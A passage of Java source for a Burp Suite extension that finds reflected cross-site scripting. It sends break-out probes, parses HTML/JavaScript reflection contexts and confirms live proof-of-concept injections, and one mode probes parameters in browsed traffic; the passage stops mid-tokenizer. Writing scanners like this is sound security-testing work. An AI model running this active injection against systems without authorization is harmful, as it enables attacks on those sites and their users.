package burp;

import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

/**
 * ContextualReflectionEngine
 *
 * A fully contextual reflected-XSS engine for modern applications, covering
 * HTML, attribute, JavaScript, CSS and JSON/JSONP reflection contexts.
 *
 * Detection is a two-request, double-confirmed process per insertion point, so
 * a finding is only ever raised on a genuine, live break-out:
 *
 *   STAGE 1 -- Measure. Inject a probe that interleaves a unique alphabetic
 *   canary with every break-out character
 *   (CANARY c0 CANARY c1 CANARY ... CANARY). The canary is pure [a-z] so it
 *   survives every output encoder; splitting the reflected block on the canary
 *   yields, for each special character, the exact transformation applied at the
 *   point of reflection (verbatim, HTML-entity-encoded, backslash-escaped,
 *   URL-encoded or stripped). A forward HTML/JS tokenizer -- which models
 *   rawtext/RCDATA elements (script, style, textarea, title, iframe, xmp, ...),
 *   quoted/unquoted attributes, URL attributes, event handlers and JS
 *   string/template literals -- fixes the exact reflection context.
 *
 *   STAGE 2 -- Confirm. The context-specific proof-of-concept derived from
 *   stage 1 is injected for real and the response is checked for the payload
 *   reflected verbatim and unescaped. Only if this live confirmation succeeds
 *   is an issue raised, which drives the false-positive rate to near zero
 *   (keyword/tag WAFs that pass single characters but block whole payloads are
 *   caught here, as is any encoding the single-character probe could not see).
 *
 * Reported issues contain only dynamic, real-time evidence gathered from these
 * two live requests -- the reflection context, the per-character break-out
 * table, the confirmed PoC and the live reflected snippet. No static
 * remediation or background text is emitted.
 */
public class ContextualReflectionEngine {

    private final IExtensionHelpers helpers;
    private final IBurpExtenderCallbacks callbacks;
    private final Settings settings;
    private final java.security.SecureRandom rng = new java.security.SecureRandom();

    /** (host|path|type|param) spots already actively probed on browsed traffic. */
    private final java.util.Set<String> liveProbed =
            java.util.Collections.newSetFromMap(new java.util.concurrent.ConcurrentHashMap<>());

    /** Break-out characters probed, in a fixed order. ('-' and '!' cover HTML
     *  comment / conditional-comment tricks like --> and --!>.) */
    private static final char[] SPECIALS = {
        '<', '>', '"', '\'', '`', '(', ')', '{', '}', ';', '/', '\\', '=', ':', ' ', '$', '-', '!'
    };

    /** HTML elements whose content is rawtext/RCDATA: a reflection inside one
     *  can only break out via the matching end tag, never by opening a new tag. */
    private static final Set<String> RAWTEXT_ELEMENTS = new HashSet<>(Arrays.asList(
        "textarea", "title", "iframe", "xmp", "noembed", "noframes", "noscript"
    ));

    enum Ctx {
        HTML_TEXT, HTML_COMMENT, TAG_NAME_OR_ATTR, ATTR_DOUBLE, ATTR_SINGLE, ATTR_UNQUOTED,
        ATTR_URL, EVENT_HANDLER, SCRIPT_DATA, SCRIPT_STRING_SINGLE, SCRIPT_STRING_DOUBLE,
        SCRIPT_TEMPLATE, STYLE, RAWTEXT, PLAINTEXT, JSON_STRING, JSONP, UNKNOWN
    }

    public ContextualReflectionEngine(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, Settings settings) {
        this.helpers = helpers;
        this.callbacks = callbacks;
        this.settings = settings;
    }

    /**
     * Run the contextual probe + live confirmation against a single insertion
     * point and return a confirmed reflected-XSS issue, or nothing.
     */
    public List<IScanIssue> scan(IHttpRequestResponse baseRequestResponse, final IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();
        if (baseRequestResponse == null || insertionPoint == null) {
            return issues;
        }
        try {
            IHttpService service = baseRequestResponse.getHttpService();
            Injector injector = value -> insertionPoint.buildRequest(helpers.stringToBytes(value));

            String pname = insertionPoint.getInsertionPointName();
            ProbeResult pr = probe(injector, service);
            // Always-on diagnostic so a running active scan shows what happened.
            callbacks.printOutput("[XSSDetector] Active scan param '" + pname + "': " + pr.diag);
            if (pr.best == null) {
                if (pr.reflected) {
                    // reflected but no break-out (filtered/encoded) -> show in Live Results
                    recordReflectedFiltered(pname, "Scanner", pr, baseRequestResponse);
                }
                return issues;
            }

            // STAGE 2 -- live confirmation. No issue without it.
            Confirmation conf = confirm(injector, service, pr.best);
            if (conf == null || !conf.confirmed) {
                // Tested but no break-out: surface it (with the full test log) in Live
                // Results so the attempted payloads are visible; never a Burp issue.
                recordTestedReflection(pname, "Scanner", pr.best, conf, pr, baseRequestResponse);
                callbacks.printOutput("[XSSDetector] Active scan param '" + pname
                        + "': break-out chars survived but PoC not confirmed (tried "
                        + (conf != null ? conf.attempts.size() : 0) + " payloads)");
                return issues;
            }

            IScanIssue issue = buildDynamicIssue(pname,
                    insertionTypeName(insertionPoint.getInsertionPointType()), "Scanner", pr.best, conf,
                    baseRequestResponse, pr);
            if (issue != null) {
                issues.add(issue);
                callbacks.printOutput("[XSSDetector] Active scan param '" + pname
                        + "': CONFIRMED " + pr.best.contextLabel + " (via " + conf.technique + ")");
            }
        } catch (Exception e) {
            if (settings != null && settings.getVerboseLogging()) {
                callbacks.printError("[XSSDetector] Contextual: " + e.getMessage());
            }
        }
        return issues;
    }

    /** How a probe/confirm value is placed into the request (insertion point or raw parameter). */
    private interface Injector {
        byte[] build(String value);
    }

    /** Parameter vector types the raw-request scanner tests: query, body, cookie,
     *  and the structured bodies modern apps use (JSON, XML, multipart). Without
     *  JSON/XML/multipart a JSON API request yields "0 parameters tested". */
    private static boolean isTestableParam(byte type) {
        return type == IParameter.PARAM_URL
            || type == IParameter.PARAM_BODY
            || type == IParameter.PARAM_COOKIE
            || type == IParameter.PARAM_JSON
            || type == IParameter.PARAM_XML
            || type == IParameter.PARAM_XML_ATTR
            || type == IParameter.PARAM_MULTIPART_ATTR;
    }

    /**
     * Build a type-aware injector for one parameter.
     *
     * For URL (request-line) and cookie (header) parameters we rebuild the request
     * OURSELVES at the parameter's exact byte offsets (getValueStart/getValueEnd),
     * inserting a single URL-encoding of the payload. This deliberately bypasses
     * helpers.updateParameter/buildParameter so the bytes sent to the server are
     * exactly what this (fully tested) code produces -- no dependence on Burp's
     * internal re-encoding, which otherwise can double-encode the payload and stop
     * the break-out characters from ever reaching the application. URL and cookie
     * live outside the message body, so Content-Length stays correct.
     *
     * Body / JSON / XML / multipart go through Burp's updateParameter, which fixes
     * Content-Length and understands the structured body.
     */
    private Injector injectorFor(final byte[] baseRequest, final IParameter p) {
        final byte type = p.getType();
        final boolean byteLevel = (type == IParameter.PARAM_URL || type == IParameter.PARAM_COOKIE);
        if (byteLevel) {
            final int vs = p.getValueStart();
            final int ve = p.getValueEnd();
            if (vs > 0 && ve >= vs && ve <= baseRequest.length) {
                return v -> {
                    byte[] enc = helpers.urlEncode(v).getBytes(StandardCharsets.ISO_8859_1);
                    byte[] out = new byte[vs + enc.length + (baseRequest.length - ve)];
                    System.arraycopy(baseRequest, 0, out, 0, vs);
                    System.arraycopy(enc, 0, out, vs, enc.length);
                    System.arraycopy(baseRequest, ve, out, vs + enc.length, baseRequest.length - ve);
                    return out;
                };
            }
        }
        final String name = p.getName();
        final boolean urlEncode = (type == IParameter.PARAM_URL
                || type == IParameter.PARAM_BODY
                || type == IParameter.PARAM_COOKIE);
        return v -> helpers.updateParameter(baseRequest,
                helpers.buildParameter(name, urlEncode ? helpers.urlEncode(v) : v, type));
    }

    private static final class ProbeResult {
        IHttpRequestResponse probeRR;
        Finding best;            // exploitable break-out finding (null if none)
        String tag;
        boolean reflected;       // the injected token came back in the response
        String contextLabel;     // where it landed (diagnostic, even when best == null)
        String diag = "not reflected"; // short human diagnostic for logging
    }

    private String bodyOf(byte[] respBytes, IResponseInfo respInfo) {
        return new String(Arrays.copyOfRange(respBytes, respInfo.getBodyOffset(), respBytes.length),
                StandardCharsets.UTF_8);
    }

    /** Context label at an index, for diagnostics when there is no break-out. */
    private String contextLabelAt(String body, int idx, MimeInfo mime) {
        try {
            if (mime.isJson || mime.isJavaScript) {
                return jsonPassiveLabel(body, idx, mime);
            }
            CtxResult c = detectContext(body, idx);
            return contextLabel(c);
        } catch (Exception e) {
            return "unknown";
        }
    }

    /**
     * Stage 1: send the measurement probe and pick the most exploitable reflection
     * site. Always returns a ProbeResult (never null) carrying a diagnostic:
     *   - best != null         : reflected AND a break-out character survived.
     *   - reflected, best null  : reflected, but no break-out survived, OR the
     *                             aggressive probe was filtered (verified with a
     *                             plain token).
     *   - !reflected            : the parameter is not reflected at all.
     */
    private ProbeResult probe(Injector injector, IHttpService service) {
        ProbeResult pr = new ProbeResult();
        try {
            String tag = randomCanary();
            IHttpRequestResponse probeRR = callbacks.makeHttpRequest(service, injector.build(buildProbe(tag)));
            pr.probeRR = probeRR;
            pr.tag = tag;
            if (probeRR == null || probeRR.getResponse() == null) {
                pr.diag = "no response to break-out probe";
                return pr;
            }
            byte[] respBytes = probeRR.getResponse();
            IResponseInfo respInfo = helpers.analyzeResponse(respBytes);
            String body = bodyOf(respBytes, respInfo);
            MimeInfo mime = classifyMime(respInfo);

            List<Integer> sites = reflectionSites(body, tag);
            if (!sites.isEmpty()) {
                pr.reflected = true;
                Finding best = null;
                for (int siteStart : sites) {
                    Finding f = evaluateSite(body, siteStart, tag, mime);
                    if (f != null && (best == null || f.confidence > best.confidence)) {
                        best = f;
                    }
                    if (best != null && best.confidence >= 100.0) {
                        break;
                    }
                }
                if (best == null) {
                    // Reflected, but survival could not be measured (the mega-probe may
                    // have been partly mangled). Try the context's real payload anyway.
                    best = optimisticFinding(body, sites.get(0), mime);
                }
                pr.best = best;
                pr.contextLabel = best != null ? best.contextLabel : contextLabelAt(body, sites.get(0), mime);
                pr.diag = best != null
                        ? ("reflected; context=" + best.contextLabel + "; trying payload")
                        : ("reflected in " + pr.contextLabel + "; no break-out character survived (encoded/stripped)");
                return pr;
            }

            // The aggressive probe did not reflect. Verify with a PLAIN token whether
            // the parameter reflects at all -- distinguishes "not reflected" from
            // "reflected but the break-out probe was filtered / the request rejected".
            String ptag = randomCanary();
            IHttpRequestResponse plainRR = callbacks.makeHttpRequest(service, injector.build(ptag));
            if (plainRR != null && plainRR.getResponse() != null) {
                IResponseInfo pInfo = helpers.analyzeResponse(plainRR.getResponse());
                String pBody = bodyOf(plainRR.getResponse(), pInfo);
                MimeInfo pMime = classifyMime(pInfo);
                int idx = pBody.indexOf(ptag);
                if (idx >= 0) {
                    pr.reflected = true;
                    pr.probeRR = plainRR;
                    pr.tag = ptag;
                    pr.contextLabel = contextLabelAt(pBody, idx, pMime);
                    // The mega-probe was blocked, but a single realistic payload may
                    // still get through. Build an optimistic finding for the detected
                    // context so confirm() tries real payloads and verifies them.
                    pr.best = optimisticFinding(pBody, idx, pMime);
                    pr.diag = pr.best != null
                            ? ("reflected in " + pr.contextLabel
                               + "; break-out probe filtered -- trying targeted payloads directly")
                            : ("reflected in " + pr.contextLabel + "; not an exploitable context");
                    return pr;
                }
            }
            pr.diag = "not reflected";
            return pr;
        } catch (Exception e) {
            pr.diag = "probe error: " + e.getMessage();
            return pr;
        }
    }

    /**
     * Real-time active confirmation on browsed/proxied traffic (opt-in). For each
     * reflected request parameter it runs the same probe-and-confirm as the active
     * scanner, so genuine reflected XSS is reported as Confirmed just by browsing.
     * Each (host, path, parameter) is probed at most once per session.
     *
     * Returns the confirmed issues so the caller can report them through the
     * central de-duplication gate (never reports directly, to avoid duplicates).
     */
    public List<IScanIssue> liveConfirm(IHttpRequestResponse rr, String source) {
        List<IScanIssue> found = new ArrayList<>();
        try {
            if (rr == null || rr.getRequest() == null || rr.getResponse() == null) {
                return found;
            }
            IResponseInfo respInfo = helpers.analyzeResponse(rr.getResponse());
            if (respInfo.getStatusCode() >= 400) {
                return found; // don't probe off error-page reflections
            }
            MimeInfo mime = classifyMime(respInfo);
            if (!contentTypeAllowed(mime.contentType)) {
                return found; // response type not in Content Type Management list
            }
            byte[] respBytes = rr.getResponse();
            String body = new String(Arrays.copyOfRange(respBytes, respInfo.getBodyOffset(), respBytes.length),
                    StandardCharsets.UTF_8);

            IRequestInfo reqInfo = helpers.analyzeRequest(rr);
            final byte[] baseRequest = rr.getRequest();
            final IHttpService service = rr.getHttpService();
            String host = service != null ? service.getHost() : "";
            String path = reqInfo.getUrl() != null ? reqInfo.getUrl().getPath() : "";

            int done = 0;
            for (IParameter p : reqInfo.getParameters()) {
                if (done >= 15) {
                    break; // keep browse-time load bounded
                }
                final byte type = p.getType();
                if (!isTestableParam(type)) {
                    continue;
                }
                String value = p.getValue();
                if (value == null || value.length() < 3 || looksNavigational(value)) {
                    continue;
                }
                String decoded = value;
                try {
                    String d = helpers.urlDecode(value);
                    if (d != null) {
                        decoded = d;
                    }
                } catch (Exception ignored) {
                    // use raw value
                }
                if (body.indexOf(decoded) < 0 && body.indexOf(value) < 0) {
                    continue; // not reflected -> do not probe
                }
                String key = host + "|" + path + "|" + type + "|" + p.getName();
                if (!liveProbed.add(key)) {
                    continue; // already probed this spot in this session
                }
                final String name = p.getName();
                Injector injector = injectorFor(baseRequest, p);

                ProbeResult pr = probe(injector, service);
                if (pr.best == null) {
                    if (pr.reflected) {
                        recordReflectedFiltered(name, source, pr, rr);
                    }
                    done++;
                    continue;
                }
                Confirmation conf = confirm(injector, service, pr.best);
                if (conf != null && conf.confirmed) {
                    IScanIssue issue = buildDynamicIssue(name, insertionTypeName(type), source, pr.best, conf,
                            rr, pr);
                    if (issue != null) {
                        found.add(issue); // reported by the caller through central de-dup
                        callbacks.printOutput("[XSSDetector] Live-confirmed reflected XSS: param '" + name
                                + "' (" + pr.best.contextLabel + ") at " + host + path);
                    }
                } else {
                    // Reflected and tested while browsing, but no break-out: record it
                    // with the full test log so the viewer shows every payload tried.
                    recordTestedReflection(name, source, pr.best, conf, pr, rr);
                }
                done++;
            }
        } catch (Exception e) {
            if (settings != null && settings.getVerboseLogging()) {
                callbacks.printError("[XSSDetector] liveConfirm: " + e.getMessage());
            }
        }
        return found;
    }

    /**
     * Real-time passive feed: while traffic is proxied/browsed, detect where a
     * request parameter is reflected in the response and record it (with its
     * context) in the Live Results view. No payload is injected here -- these
     * are candidates to be actively confirmed, so they are recorded as
     * {@link XssFinding#STATUS_REFLECTED} at Info severity and are upgraded to
     * Confirmed automatically if an active scan verifies them.
     */
    public void passiveReflections(IHttpRequestResponse rr, String source) {
        try {
            if (rr == null || rr.getResponse() == null || rr.getRequest() == null) {
                return;
            }
            IResponseInfo respInfo = helpers.analyzeResponse(rr.getResponse());
            // Ignore error pages: a value echoed in a 4xx/5xx is not a usable
            // reflection and only adds noise to the Live Results view.
            short status = respInfo.getStatusCode();
            if (status >= 400) {
                return;
            }
            MimeInfo mime = classifyMime(respInfo);
            if (!contentTypeAllowed(mime.contentType)) {
                return; // response type not in Content Type Management list
            }
            byte[] respBytes = rr.getResponse();
            String body = new String(Arrays.copyOfRange(respBytes, respInfo.getBodyOffset(), respBytes.length),
                    StandardCharsets.UTF_8);

            IRequestInfo reqInfo = helpers.analyzeRequest(rr);
            String method = reqInfo.getMethod();
            String url = reqInfo.getUrl() != null ? reqInfo.getUrl().toString() : "";
            IHttpService svc = rr.getHttpService();
            String host = svc != null ? svc.getHost() : "";

            int reported = 0;
            for (IParameter p : reqInfo.getParameters()) {
                if (reported >= 10) {
                    break; // keep the browse feed light
                }
                String value = p.getValue();
                if (value == null || value.length() < 4) {
                    continue;
                }
                if (looksNavigational(value)) {
                    continue; // filenames/paths/URLs echoed back are not XSS candidates
                }
                String decoded = value;
                try {
                    String d = helpers.urlDecode(value);
                    if (d != null) {
                        decoded = d;
                    }
                } catch (Exception ignored) {
                    // use raw value
                }
                int idx = body.indexOf(decoded);
                if (idx < 0 && !decoded.equals(value)) {
                    idx = body.indexOf(value);
                }
                if (idx < 0) {
                    continue;
                }
                // Classify the reflection context. JSON/JS responses use the
                // JSON-aware classifier instead of the HTML tokenizer, so the
                // realtime feed labels them correctly (JSON value / JSONP).
                String label;
                if (mime.isJson || mime.isJavaScript) {
                    label = jsonPassiveLabel(body, idx, mime);
                } else {
                    CtxResult c = detectContext(body, idx);
                    if (c.ctx == Ctx.UNKNOWN || c.ctx == Ctx.PLAINTEXT) {
                        continue; // nothing actionable to flag
                    }
                    label = contextLabel(c);
                }
                XssFinding xf = new XssFinding(
                        "Info", XssFinding.STATUS_REFLECTED, label, p.getName(),
                        method, host, url, source,
                        "Reflection seen while browsing - run an active scan to confirm.",
                        rr.getRequest(), rr.getResponse());
                xf.reqHighlight = value;    // the parameter value in the request
                xf.respHighlight = decoded; // where it is reflected in the response
                if (svc != null) {
                    xf.port = svc.getPort();
                    xf.https = "https".equalsIgnoreCase(svc.getProtocol());
                }
                FindingStore.get().add(xf);
                reported++;
            }
        } catch (Exception e) {
            if (settings != null && settings.getVerboseLogging()) {
                callbacks.printError("[ContextualReflectionEngine] passive: " + e.getMessage());
            }
        }
    }

    /**
     * Explicit active scan of one request (e.g. from the right-click menu). Unlike
     * the browse-time feed this probes EVERY URL/body/cookie parameter regardless
     * of whether its current value is already reflected, and ignores the
     * once-per-session guard, so "Active XSS scan" always does a full pass.
     * Works in any Burp edition (it sends its own requests, independent of the
     * Pro scanner). Returns confirmed issues for the caller to report.
     */
    public List<IScanIssue> scanRequest(IHttpRequestResponse rr, String source) {
        return scanRequest(rr, source, new ScanStats());
    }

    /** Per-request diagnostics for the Active XSS scan, so a "0 confirmed" result
     *  is explained (what reflected, in which context) instead of silent. */
    public static final class ScanStats {
        public int params;        // URL/body/cookie parameters tested
        public int reflected;     // parameters whose injection was reflected
        public int confirmed;     // parameters with a confirmed break-out
        public final java.util.List<String> notes = new java.util.ArrayList<>();
    }

    public List<IScanIssue> scanRequest(IHttpRequestResponse rr, String source, ScanStats stats) {
        List<IScanIssue> found = new ArrayList<>();
        try {
            if (rr == null || rr.getRequest() == null) {
                return found;
            }
            final IHttpService service = rr.getHttpService();
            final byte[] baseRequest = rr.getRequest();
            IRequestInfo reqInfo = helpers.analyzeRequest(rr);
            String method = reqInfo.getMethod();
            String url = reqInfo.getUrl() != null ? reqInfo.getUrl().toString() : "";
            String host = service != null ? service.getHost() : "";

            int done = 0;
            // 1) Every parsed parameter (query / body / cookie / JSON / XML / multipart).
            for (IParameter p : reqInfo.getParameters()) {
                if (done >= 40) {
                    break;
                }
                final byte type = p.getType();
                if (!isTestableParam(type)) {
                    continue;
                }
                testInjection(p.getName(), insertionTypeName(type),
                        injectorFor(baseRequest, p), p.getValue(),
                        service, rr, source, method, host, url, stats, found);
                done++;
            }
            // 2) URL path segments (folder + filename) -- catches path-based and
            //    404/error-page reflections that have no query/body parameter.
            for (PathSeg seg : urlPathSegments(baseRequest)) {
                if (done >= 40) {
                    break;
                }
                testInjection(seg.name, "URL path", seg.injector, seg.value,
                        service, rr, source, method, host, url, stats, found);
                done++;
            }
        } catch (Exception e) {
            if (settings != null && settings.getVerboseLogging()) {
                callbacks.printError("[XSSDetector] scanRequest: " + e.getMessage());
            }
        }
        return found;
    }

    /** Probe + confirm one insertion point, recording the outcome in stats and
     *  surfacing a confirmed issue or a reflected-but-filtered Live Results row. */
    private void testInjection(String name, String typeLabel, Injector injector, String baseValueHighlight,
                               IHttpService service, IHttpRequestResponse rr, String source,
                               String method, String host, String url, ScanStats stats, List<IScanIssue> found) {
        stats.params++;
        ProbeResult pr = probe(injector, service);
        if (pr.best == null) {
            if (pr.reflected) {
                stats.reflected++;
                recordReflectedFiltered(name, source, pr, rr);
                stats.notes.add("'" + name + "': " + pr.diag);
            } else {
                stats.notes.add("'" + name + "': " + pr.diag);
            }
            return;
        }
        stats.reflected++;
        Confirmation conf = confirm(injector, service, pr.best);
        if (conf != null && conf.confirmed) {
            IScanIssue issue = buildDynamicIssue(name, typeLabel, source, pr.best, conf, rr, pr);
            if (issue != null) {
                found.add(issue);
                stats.confirmed++;
                stats.notes.add("'" + name + "': CONFIRMED " + pr.best.contextLabel
                        + " (via " + conf.technique + ")");
            }
        } else {
            // Reflected and tested, but no break-out: record it (with the full test
            // log of every payload tried) in Live Results; never a Burp issue.
            recordTestedReflection(name, source, pr.best, conf, pr, rr);
            stats.notes.add("'" + name + "': reflected in " + pr.best.contextLabel
                    + " but break-out filtered/encoded (not exploitable)");
        }
    }

    /** A URL path segment turned into an injectable insertion point. */
    private static final class PathSeg {
        final String name;
        final String value;
        final Injector injector;
        PathSeg(String name, String value, Injector injector) {
            this.name = name; this.value = value; this.injector = injector;
        }
    }

    /** Split the request-line path into segments and build an injector for each
     *  that rewrites just that segment (URL-encoded) in the full request. */
    private List<PathSeg> urlPathSegments(final byte[] baseRequest) {
        List<PathSeg> segs = new ArrayList<>();
        try {
            String req = new String(baseRequest, StandardCharsets.ISO_8859_1);
            int lineEnd = req.indexOf("\r\n");
            if (lineEnd < 0) {
                return segs;
            }
            String line = req.substring(0, lineEnd);
            int sp1 = line.indexOf(' ');
            int sp2 = line.indexOf(' ', sp1 + 1);
            if (sp1 < 0 || sp2 < 0) {
                return segs;
            }
            String target = line.substring(sp1 + 1, sp2);
            int q = target.indexOf('?');
            String path = q >= 0 ? target.substring(0, q) : target;
            // absolute offset of the path within the full request string
            int pathAbs = sp1 + 1;
            int i = 0;
            int n = path.length();
            while (i < n) {
                if (path.charAt(i) == '/') {
                    i++;
                    continue;
                }
                int start = i;
                while (i < n && path.charAt(i) != '/') {
                    i++;
                }
                final int segStartAbs = pathAbs + start;
                final int segEndAbs = pathAbs + i;
                final String value = path.substring(start, i);
                if (value.isEmpty()) {
                    continue;
                }
                Injector inj = v -> {
                    String s = new String(baseRequest, StandardCharsets.ISO_8859_1);
                    String rebuilt = s.substring(0, segStartAbs) + helpers.urlEncode(v) + s.substring(segEndAbs);
                    return rebuilt.getBytes(StandardCharsets.ISO_8859_1);
                };
                segs.add(new PathSeg("URL path: " + value, value, inj));
            }
        } catch (Exception ignored) {
            // best-effort path parsing
        }
        return segs;
    }

    /** Lightweight JSON/JSONP context label for the realtime passive feed. */
    private String jsonPassiveLabel(String body, int idx, MimeInfo mime) {
        // JSONP: the value sits at (or near) the start and is immediately called.
        // Scan to the end of the reflected identifier region.
        int p = idx;
        while (p < body.length() && (Character.isLetterOrDigit(body.charAt(p)) || body.charAt(p) == '_')) {
            p++;
        }
        boolean nearStart = idx <= firstNonWhitespace(body) + 2;
        if (nearStart && p < body.length() && body.charAt(p) == '(') {
            return "JSONP callback";
        }
        if (mime.htmlRenderable) {
            return "JSON rendered as HTML";
        }
        return "JSON value";
    }

    private String contextLabel(CtxResult c) {
        switch (c.ctx) {
            case HTML_TEXT: return "HTML text";
            case HTML_COMMENT: return "HTML comment";
            case TAG_NAME_OR_ATTR: return "Tag / attribute-name position";
            case ATTR_DOUBLE: return "Double-quoted attribute";
            case ATTR_SINGLE: return "Single-quoted attribute";
            case ATTR_UNQUOTED: return "Unquoted attribute";
            case ATTR_URL: return "URL attribute";
            case EVENT_HANDLER: return "Event handler (JavaScript)";
            case SCRIPT_DATA: return "Inline <script> block";
            case SCRIPT_STRING_SINGLE: return "JavaScript string (single-quoted)";
            case SCRIPT_STRING_DOUBLE: return "JavaScript string (double-quoted)";
            case SCRIPT_TEMPLATE: return "JavaScript template literal";
            case STYLE: return "Inline <style> block";
            case RAWTEXT: return "Rawtext element <" + (c.rawTag.isEmpty() ? "textarea" : c.rawTag) + ">";
            case JSON_STRING: return "JSON value";
            case JSONP: return "JSONP callback";
            default: return "Reflection";
        }
    }

    /** True for values that are clearly navigation tokens (paths, filenames,
     *  URLs) rather than user input worth flagging as an XSS candidate. */
    private static boolean looksNavigational(String v) {
        if (v == null) {
            return false;
        }
        String s = v.trim().toLowerCase(Locale.ROOT);
        if (s.isEmpty()) {
            return false;
        }
        if (s.contains("://")) {
            return true;
        }
        if (!s.matches("[a-z0-9_./:%-]+")) {
            return false; // contains spaces/special chars -> likely real input, keep it
        }
        return s.contains("/")
                || s.matches(".*\\.(html?|jspx?|php|aspx?|do|action|css|js|png|jpe?g|gif|svg|ico|json|xml|pdf|woff2?)$");
    }

    // ------------------------------------------------------------------
    // Probe construction / decoding
    // ------------------------------------------------------------------

    private String randomCanary() {
        StringBuilder sb = new StringBuilder("zq");
        String alphabet = "abcdefghijklmnopqrstuvwxyz";
        for (int i = 0; i < 7; i++) {
            sb.append(alphabet.charAt(rng.nextInt(alphabet.length())));
        }
        return sb.toString();
    }

    /** CANARY c0 CANARY c1 CANARY ... c(n-1) CANARY */
    private String buildProbe(String tag) {
        StringBuilder sb = new StringBuilder(tag);
        for (char c : SPECIALS) {
            sb.append(c).append(tag);
        }
        return sb.toString();
    }

    private Map<Character, CharFate> decodeSurvival(String body, int siteStart, String tag) {
        Map<Character, CharFate> fate = new HashMap<>();
        int blockEnd = Math.min(body.length(), siteStart + tag.length() * (SPECIALS.length + 2) + 64 * SPECIALS.length);
        String block = body.substring(siteStart, blockEnd);
        String[] parts = block.split(java.util.regex.Pattern.quote(tag), -1);
        for (int i = 0; i < SPECIALS.length; i++) {
            char c = SPECIALS[i];
            String t = (i + 1 < parts.length) ? parts[i + 1] : "";
            fate.put(c, classifyFate(c, t));
        }
        return fate;
    }

    private CharFate classifyFate(char c, String transform) {
        CharFate f = new CharFate();
        if (transform == null || transform.isEmpty()) {
            f.stripped = true;
            return f;
        }
        int idx = transform.indexOf(c);
        if (idx >= 0) {
            f.present = true;
            f.unescaped = (idx == 0) || transform.charAt(idx - 1) != '\\';
            if (idx > 0 && transform.charAt(idx - 1) == '\\') {
                f.backslashEscaped = true;
            }
        }
        String low = transform.toLowerCase(Locale.ROOT);
        if (low.contains("&lt;") || low.contains("&gt;") || low.contains("&quot;")
                || low.contains("&#39;") || low.contains("&#x27;") || low.contains("&apos;")
                || low.contains("&#x3c;") || low.contains("&#60;") || low.contains("&amp;")) {
            f.htmlEncoded = true;
        }
        if (low.contains("%3c") || low.contains("%3e") || low.contains("%22") || low.contains("%27")) {
            f.urlEncoded = true;
        }
        return f;
    }

    // ------------------------------------------------------------------
    // Context detection (forward HTML/JS tokenizer)
    // ------------------------------------------------------------------

    private static final class CtxResult {
        Ctx ctx = Ctx.UNKNOWN;
        String attrName = "";
        String rawTag = "";       // the rawtext/RCDATA element name, when applicable
        boolean valueAtStart;
    }

    private CtxResult detectContext(String body, int pos) {
        CtxResult r = new CtxResult();
        final int DATA = 0, TAG = 1, COMMENT = 2, RAW_SCRIPT = 3, RAW_STYLE = 4, RAW_TEXT = 5, PLAIN = 6;
        int mode = DATA;

        String tagName = "";
        String attrName = "";
        String rawTag = "";
        boolean inAttrValue = false;
        char attrQuote = 0;
        int valueStartPos = -1;
        char jsQuote = 0;
        boolean jsLineComment = false, jsBlockComment = false;

        int i = 0;
        int n = body.length();
        while (i < pos && i < n) {
            char c = body.charAt(i);
            switch (mode) {
                case DATA: {
                    if (c == '<') {
                        if (body.startsWith("<!--", i)) {
                            mode = COMMENT;
                            i += 4;
                            continue;
                        }
                        int j = i + 1;
                        if (j < n && body.charAt(j) == '/') {
                            j++;
                        }
                        if (j < n && isNameStart(body.charAt(j))) {
                            int s = j;
                            while (j < n && isNameChar(body.charAt(j))) {
                                j++;
                            }
                            tagName = body.substring(s, j).toLowerCase(Locale.ROOT);
                            attrName = "";
                            inAttrValue = false;
                            attrQuote = 0;
                            mode = TAG;
                            i = j;
                            continue;
                        }
                    }
                    i++;
                    break;
                }
                case COMMENT: {
                    if (body.startsWith("-->", i)) {
                        mode = DATA;
                        i += 3;
                        continue;
                    }
                    i++;
                    break;
                }
                case TAG: {
                    if (attrQuote != 0) {
                        if (c == attrQuote) {
                            attrQuote = 0;
                            inAttrValue = false;
                            attrName = "";
                        }
                        i++;
                        break;
                    }
                    if (inAttrValue) {
                        if (c == '>' || isWhite(c)) {
                            inAttrValue = false;
                            attrName = "";
                            if (c == '>') {
                                int[] res = enterBody(tagName);
                                mode = res[0];
                                rawTag = (res[0] == RAW_TEXT) ? tagName : "";
                                tagName = "";
                            }
                            i++;
                        } else {
                            i++;
                        }
                        break;
                    }
                    if (c == '>') {
                        int[] res = enterBody(tagName);
                        mode = res[0];
                        rawTag = (res[0] == RAW_TEXT) ? tagName : "";
                        tagName = "";
                        i++;
                        break;
                    }
                    if (c == '"' || c == '\'') {
                        attrQuote = c;
                        valueStartPos = i + 1;
                        i++;
                        break;
                    }
                    if (c == '=') {
                        i++;
                        while (i < pos && i < n && isWhite(body.charAt(i))) {
                            i++;
                        }
                        if (i < n && (body.charAt(i) == '"' || body.charAt(i) == '\'')) {
                            attrQuote = body.charAt(i);
                            valueStartPos = i + 1;
                            i++;
                        } else {
                            inAttrValue = true;
                            valueStartPos = i;
                        }
                        break;
                    }
                    if (isWhite(c)) {
                        i++;
                        break;
                    }
                    int s = i;
                    while (i < pos && i < n && !isWhite(body.charAt(i)) && body.charAt(i) != '='
                            && body.charAt(i) != '>' && body.charAt(i) != '"' && body.charAt(i) != '\'') {
                        i++;
                    }
                    attrName = body.substring(s, Math.min(i, n)).toLowerCase(Locale.ROOT);
                    break;
                }
                case RAW_SCRIPT: {
                    if ((c == '<') && regionIgnoreCase(body, i, "</script")) {
                        mode = DATA;
                        jsQuote = 0;
                        jsLineComment = false;
                        jsBlockComment = false;
                        i += 2;
                        continue;
                    }
                    if (jsLineComment) {
                        if (c == '\n') {
                            jsLineComment = false;
                        }
                        i++;
                        break;
                    }
                    if (jsBlockComment) {
                        if (c == '*' && i + 1 < n && body.charAt(i + 1) == '/') {
                            jsBlockComment = false;
                            i += 2;
                            continue;
                        }
                        i++;
                        break;
                    }
                    if (jsQuote != 0) {
                        if (c == '\\') {
                            i += 2;
                            continue;
                        }
                        if (c == jsQuote) {
                            jsQuote = 0;
                        }
                        i++;
                        break;
                    }
                    if (c == '/' && i + 1 < n && body.charAt(i + 1) == '/') {
                        jsLineComment = true;
                        i += 2;
                        continue;
                    }
                    if (c == '/' && i + 1 < n && body.charAt(i + 1) == '*') {
                        jsBlockComment = true;
